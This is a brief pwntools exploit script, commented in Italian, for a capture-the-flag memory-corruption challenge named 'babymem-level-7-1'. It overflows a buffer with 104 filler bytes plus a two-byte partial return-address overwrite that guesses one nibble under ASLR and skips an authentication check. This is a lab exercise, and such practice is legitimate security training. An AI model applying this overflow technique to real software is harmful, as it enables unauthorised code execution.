from pwn import *

elf = ELF("/challenge/babymem-level-7-1")
p = elf.process()

# Dimensione della linea
p.sendline(b"106")

# Posso conoscere solo il primo byte (least significant), l'ultimo visibile dal disassembler (per l'allineamente del paging)
#   Il pagina allinea a 0x1000, quindi le ultime 3 cifre devono essere uguali, la prima si tira ad indovinare 
#   Aggiungo per skippare il check su win_authed()
payload = b"A"*(104) + b'\xf6' + b'\x66'

# Mandare il payload
p.sendline(payload)

p.interactive()
